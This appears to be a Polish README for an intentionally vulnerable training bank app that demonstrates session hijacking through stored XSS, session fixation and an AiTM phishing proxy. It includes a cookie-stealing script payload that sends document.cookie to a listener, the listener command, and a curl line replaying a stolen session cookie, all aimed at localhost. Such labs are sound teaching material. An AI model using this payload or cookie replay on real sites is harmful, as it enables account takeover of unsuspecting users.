# Session Hijacking Lab — NovaBank

Celowo podatna aplikacja webowa (mini-bank) do nauki, jak działa **przejęcie sesji**
(*session hijacking*). Projekt edukacyjny — aplikacja jest celowo podatna, bez żadnego trybu bezpiecznego.

> ⚠️ Materiał **wyłącznie edukacyjny**. Uruchamiaj tylko lokalnie, na własnej maszynie.

---

## 🚀 Szybki start

Potrzebujesz tylko **Pythona 3** — żadnych bibliotek, żadnego `pip install`.

```powershell
git clone https://github.com/mipacyna/session-hijacking-lab-baim.git
cd session-hijacking-lab-baim
python app.py
```

Otwórz w przeglądarce **http://localhost:5476** i zaloguj się:

| Konto | Login / hasło |
|---|---|
| Ofiara | `alice` / `password123` |
| Atakujący | `mallory` / `mallory123` |

Nie masz gita? Na GitHubie **Code → Download ZIP**, rozpakuj i w folderze uruchom `python app.py`.
Masz Dockera? Zamiast tego: `docker compose up --build`.

---

## Co pokazuje lab

Mini-bank, na którym można na żywo prześledzić przejęcie cudzej sesji:

- **XSS** — wstrzyknięty skrypt wykrada ciasteczko sesyjne.
- **Session Fixation** — atakujący narzuca ofierze znany identyfikator sesji.
- **Phishing AiTM** — reverse proxy (`aitm.py`) przechwytuje sesję w locie (jak Evilginx).

Myśl przewodnia: *sesja to „bilet na okaziciela" — kto ma ciasteczko `SESSIONID`, ten jest
zalogowanym użytkownikiem, bez hasła i bez 2FA.*

---

## Payload XSS (do wypróbowania)

Podatność to **stored XSS w tytule przelewu** — serwer renderuje tytuł bez escapowania.
Zaloguj się jako `mallory`, wyślij Alicji przelew na `0,01`, a w polu **Tytuł przelewu** wklej:

```html
<script>new Image().src="http://localhost:9000/?c="+encodeURIComponent(document.cookie)</script>
```

Na osobnym terminalu odpal nasłuch atakującego:

```powershell
python -m http.server 9000
```

Gdy Alicja otworzy historię transakcji, jej przeglądarka wykona skrypt i wyśle `SESSIONID`
na ten serwer. Skradzione cookie wklejasz u siebie — **DevTools → Application → Cookies**
albo:

```powershell
curl http://localhost:5476/dashboard -H "Cookie: SESSIONID=<skradziony_id>"
```

…i jesteś zalogowany jako Alicja, bez hasła.

> Dlaczego działa: tytuł przelewu trafia do HTML surowo, a cookie nie ma flagi `HttpOnly`,
> więc `document.cookie` (JavaScript) może je odczytać i wysłać na zewnątrz.

---

## Tryby uruchomienia

| Polecenie | Co uruchamia |
|---|---|
| `python app.py` | podatny bank (XSS + Session Fixation) na porcie 5476 |
| `python aitm.py` | proxy AiTM (phishing) na porcie 7000 |

Reset stanu labu (salda, sesje): **http://localhost:5476/reset**

---

## Pliki

- `app.py` — podatny bank (czysty Python, bez zależności).
- `aitm.py` — reverse proxy AiTM (symulacja Evilginx).
- `Dockerfile`, `docker-compose.yml` — uruchomienie w kontenerze.
- `start.ps1` — skrót do uruchomienia bez Dockera.
